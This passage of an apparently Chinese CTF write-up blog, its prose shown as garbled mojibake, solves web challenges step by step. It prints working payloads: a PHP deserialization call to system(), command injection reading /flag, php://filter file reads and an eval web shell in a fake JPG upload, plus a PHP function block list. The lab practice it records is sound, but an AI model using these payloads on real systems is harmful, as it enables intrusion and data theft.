invoke__">setTimeout</span>(<span class="hljs-string">&quot;document.form1.submit()&quot;</span>,<span class="hljs-number">5000</span>)<br>&lt;/script&gt;<br>&lt;p&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125;<br>    &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<br>        <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">?&gt;</span><br>&lt;/p&gt;<br>&lt;form  id=form1 name=form1 action=<span class="hljs-string">&quot;index.php&quot;</span> method=post&gt;<br>    &lt;input type=hidden id=func name=func value=<span class="hljs-string">&#x27;date&#x27;</span>&gt;<br>    &lt;input type=hidden id=p name=p value=<span class="hljs-string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°è¿‡æ»¤äº†ä¸€å †å‡½æ•°  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span><br></code></pre></td></tr></table></figure>
<p>å¥½åƒæ²¡æœ‰file_get_contents() ?</p>
<p>func&#x3D;file_get_contents;highlight_file&amp;p&#x3D;flag<br>&#x2F;&#x2F;ä¸è¡Œ</p>
<p>func&#x3D;file_get_contents&amp;p&#x3D;&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<p>Warning: file_get_contents(&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.php): failed to open stream: No such file or directory in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 24</p>
<p>ä¸è¡Œï¼Œçœ‹wpè¯´è¦ç”¨ååºåˆ—åŒ–ï¼Œä»”ç»†çœ‹ä¸€çœ¼æºç <br>æœ‰ä¸ªfunction __destruct()<br>æ”¹ä¸ä¼šæ˜¯è¿™ä¸ªï¼Ÿ  </p>
<p>å¯è¿™é‡Œä¹Ÿæ²¡æœ‰unserialize å•Š<br>ä¸ºä»€ä¹ˆæ˜¯ç”¨ååºåˆ—åŒ–ï¼Ÿ</p>
<p>åŸæ¥funcå°±ç›´æ¥ä¼ unserializeå•Š<br>å¯¹å“¦ï¼Œå®ƒä¹Ÿæ˜¯phpçš„ä¸€ä¸ªå‡½æ•°    </p>
<p>ç›´æ¥ä¼ </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">func</span>=unserialize&amp;p=O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Test&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;p&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;find / -name flag*&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;func&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;system&quot;</span>;&#125;<br><br></code></pre></td></tr></table></figure>
<p>ç„¶å_destruct å°±èƒ½è§¦å‘äº†  </p>
<p>å°±èƒ½æ‰¾åˆ°flagä½ç½®äº†</p>
<h1 id="NISACTF-2022-easyssrf"><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1><p>ç»™ä¸€ä¸ªè·å–ç½‘é¡µå¿«ç…§çš„åŠŸèƒ½<br>é‚£ä¸ç”¨çŒœå°±æ˜¯æœ‰curlå‡½æ•°<br>æ‰«ä¸€ä¸‹ç›®å½•æ²¡æ‰«å‡ºä¸œè¥¿  </p>
<p>æŠ“åŒ…å¾—åˆ°</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>26<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node7.anna.nssctf.cn:29484/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-mel">url=<span class="hljs-keyword">file</span>%3A%2F%2Findex.php</span><br></code></pre></td></tr></table></figure>
<p>f12 æºç ä¹Ÿæ²¡æœ‰åŠŸèƒ½æºç   </p>
<p>è¾“å…¥file:&#x2F;&#x2F;&#x2F;flag<br>æç¤ºï¼š<br>éƒ½è¯´äº†è¿™é‡Œçœ‹ä¸äº†flagã€‚ã€‚ä½†æ˜¯å¯ä»¥çœ‹çœ‹æç¤ºæ–‡ä»¶ï¼š&#x2F;fl4g  </p>
<p>file:&#x2F;&#x2F;&#x2F;fl4g  </p>
<p>ä½ åº”è¯¥çœ‹çœ‹é™¤äº†index.phpï¼Œæ˜¯ä¸æ˜¯è¿˜æœ‰ä¸ªha1x1ux1u.php  </p>
<p>file:&#x2F;&#x2F;&#x2F;ha1x1ux1u.php<br>ä¸è¡Œ</p>
<p>åœ¨urlé‡Œç›´æ¥è®¿é—®ha1x1ux1u.php<br>å¾—åˆ°ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;file&quot;</span>))&#123;<br>  <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ä½ è´¥äº†.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">//flag in /flag</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);<br></code></pre></td></tr></table></figure>
<p>ä¸èƒ½ç”¨file:&#x2F;&#x2F;<br>ä½†æ˜¯ç«Ÿç„¶æœ‰file_get_contents()é‚£å°±èƒ½ç”¨phpä¼ªåè®®  </p>
<p>ç›´æ¥ä¼ å…¥ï¼š<br><a target="_blank" rel="noopener" href="http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag">http://node7.anna.nssctf.cn:29484/ha1x1ux1u.php?file=/flag</a>    </p>
<p>å°±æ‹¿åˆ°äº†flag?ä¸ç”¨ä¼ªåè®®ï¼Ÿ</p>
<p>æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç”¨phpä¼ªåè®®ä¹Ÿå¯ä»¥ï¼š<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag<br>å›æ˜¾:<br>TlNTQ1RGezg4YmE0NWNjLTJlYTEtNGRiNS04MzY1LWMzOTA0MDFiNmQ5N30K</p>
<p>è§£ç å°±æ˜¯flag  </p>
<h1 id="LitCTF-2023-å¯¼å¼¹è¿·è¸ª"><a href="#LitCTF-2023-å¯¼å¼¹è¿·è¸ª" class="headerlink" title="[LitCTF 2023]å¯¼å¼¹è¿·è¸ª"></a>[LitCTF 2023]å¯¼å¼¹è¿·è¸ª</h1><p>è€è§„çŸ©ï¼Œåªç©ä¸€é<br>f12 æ‰¾åˆ°flag<br>flagå­—æ ·è¢«æ”¹ä¸º<br>F|L|A|G<br>ç›´æ¥æœæœä¸åˆ°çš„  </p>
<h1 id="NCTF-2018-ç­¾åˆ°é¢˜"><a href="#NCTF-2018-ç­¾åˆ°é¢˜" class="headerlink" title="[NCTF 2018] ç­¾åˆ°é¢˜"></a>[NCTF 2018] ç­¾åˆ°é¢˜</h1><p>æ‰¾äº†åŠå°æ—¶ï¼Œcookieå’Œè¯·æ±‚å¤´é‡Œé¢åˆ†åˆ«æœ‰ä¸¤ä¸ªå‡çš„flag  </p>
<p>çœŸflagåœ¨æºè®¿é—®é“¾æ¥<br>å³&#x2F;index.phpçš„è®¿é—®æ ‡å¤´é‡Œ  </p>
<h1 id="NSSCTF-2022-Spring-Recruit-ezgame"><a href="#NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="[NSSCTF 2022 Spring Recruit]ezgame"></a>[NSSCTF 2022 Spring Recruit]ezgame</h1><p>f12 ç›´æ¥æ‰¾<br>æˆ–è€…ä¿®æ”¹å‰ç«¯éƒ½è¡Œ  </p>
<h1 id="LitCTF-2023-Ping"><a href="#LitCTF-2023-Ping" class="headerlink" title="[LitCTF 2023]Ping"></a>[LitCTF 2023]Ping</h1><p>å°è¯•ä¸€ä¸‹pingæˆ‘çš„blogï¼Œæç¤ºåªèƒ½ping ipåœ°å€  </p>
<p>è¯•äº†ä¸€ä¸‹ping æˆ‘çš„æœåŠ¡ip å’Œ 127.0.0.0<br>éƒ½æ˜¯ç™¾åˆ†ç™¾ä¸¢åŒ…ç‡  </p>
<p>ä¸ç®¡äº†ï¼ŒæŠ“åŒ…çœ‹çœ‹  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>27<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://node5.anna.nssctf.cn:29540/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-autoit">command=<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>&amp;<span class="hljs-built_in">ping</span>=<span class="hljs-built_in">ping</span></span><br></code></pre></td></tr></table></figure>
<p>æ”¹ä¸€ä¸‹çœ‹çœ‹  </p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=/&amp;ping=<span class="hljs-keyword">ls</span><br><br>æ²¡å›æ˜¾<br><br><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span>&amp;ping=ping<br><br>/å›æ˜¾ï¼š<br><span class="hljs-built_in">index</span>.php<br>upload<br></code></pre></td></tr></table></figure>
<p>è¯•äº†ä¸€ä¸‹uploadç›®å½•403  </p>
<p>é‚£ç›´æ¥çœ‹æ ¹ç›®å½•</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">command</span>=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>|<span class="hljs-keyword">ls</span> /&amp;ping=ping<br><br>å›æ˜¾ï¼š<br>bin<span class="hljs-symbol">&lt;br&gt;</span><br>dev<span class="hljs-symbol">&lt;br&gt;</span><br>etc<span class="hljs-symbol">&lt;br&gt;</span><br>flag<span class="hljs-symbol">&lt;br&gt;</span><br>home<span class="hljs-symbol">&lt;br&gt;</span><br>lib<span class="hljs-symbol">&lt;br&gt;</span><br>media<span class="hljs-symbol">&lt;br&gt;</span><br>mnt<span class="hljs-symbol">&lt;br&gt;</span><br><span class="hljs-keyword">opt</span><span class="hljs-symbol">&lt;br&gt;</span><br>proc<span class="hljs-symbol">&lt;br&gt;</span><br>root<span class="hljs-symbol">&lt;br&gt;</span><br>run<span class="hljs-symbol">&lt;br&gt;</span><br>sbin<span class="hljs-symbol">&lt;br&gt;</span><br>srv<span class="hljs-symbol">&lt;br&gt;</span><br>sys<span class="hljs-symbol">&lt;br&gt;</span><br>tmp<span class="hljs-symbol">&lt;br&gt;</span><br>usr<span class="hljs-symbol">&lt;br&gt;</span><br>var<span class="hljs-symbol">&lt;br&gt;</span><br></code></pre></td></tr></table></figure>
<p>é‚£æ¥ä¸‹æ¥cat &#x2F;flagå°±è¡Œ  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">command</span>=127.0.0.0|cat /flag&amp;<span class="hljs-attribute">ping</span>=ping<br></code></pre></td></tr></table></figure>
<p>æ‹¿åˆ°flag</p>
<h1 id="TGCTF-ezupload"><a href="#TGCTF-ezupload" class="headerlink" title="TGCTF ezupload"></a>TGCTF ezupload</h1><p>å…ˆä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„jpg   </p>
<p>å›æ˜¾  </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">&#123;<span class="hljs-string">&quot;status_code&quot;</span>:<span class="hljs-number">403</span>,<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-char escape_">\u</span>7981<span class="hljs-char escape_">\u</span>6b62<span class="hljs-char escape_">\u</span>4fdd<span class="hljs-char escape_">\u</span>5b58<span class="hljs-char escape_">\u</span>4e3a<span class="hljs-char escape_">\u</span>8be5<span class="hljs-char escape_">\u</span>7c7b<span class="hljs-char escape_">\u</span>578b<span class="hljs-char escape_">\u</span>6587<span class="hljs-char escape_">\u</span>4ef6<span class="hljs-char escape_">\u</span>ff01&quot;</span>&#125;<br><br>unicodeè§£ç åçš„æ„æ€å°±æ˜¯<br><br>æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼<br><br>æˆ‘ä¸æ˜ç™½  <br></code></pre></td></tr></table></figure>
<p>æŠ“åŒ…ä¼ é©¬çœ‹çœ‹ï¼š  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/upload.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:62381<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>355<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary5Frc88R0NhJL8adt<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://127.0.0.1:62381/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;name&quot;; filename=&quot;shell.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: aimage/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[zhong]);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">ä¸Šä¼ æ–‡ä»¶</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary5Frc88R0NhJL8adt--</span></span><br><span class="language-pgsql"></span><br></code></pre></td></tr></table></figure>
<p>è¿˜æ˜¯ä¸è¡Œ   </p>
<p>æ‰«ä¸€ä¸‹ç›®å½•<br>çœ‹åˆ°æœ‰index.php.bak  </p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-attr">[17:07:56]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:07:57]</span> <span class="hljs-number">200</span> -  <span class="hljs-number">419</span>B  - /index<span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><br><span class="hljs-selector-attr">[17:10:56]</span> <span class="hljs-number">200</span> -   <span class="hljs-number">30</span>B  - /upload<span class="hljs-selector-class">.php</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - /uploads  -&gt;  http:<span class="hljs-comment">//127.0.0.1/uploads/</span><br><span class="hljs-selector-attr">[17:10:57]</span> <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - /uploads/<br></code></pre></td></tr></table></figure>
<p>è®¿é—®ä¸€ä¸‹uploads&#x2F;,403,é¡ºä¾¿çŸ¥é“äº†æœåŠ¡ç«¯æ˜¯nginx<br>é‚£çŒœæµ‹ä¸€ä¸‹ä¼šæœ‰upload.php.bak<br>ç»™æˆ‘çŒœå¯¹äº†   </p>
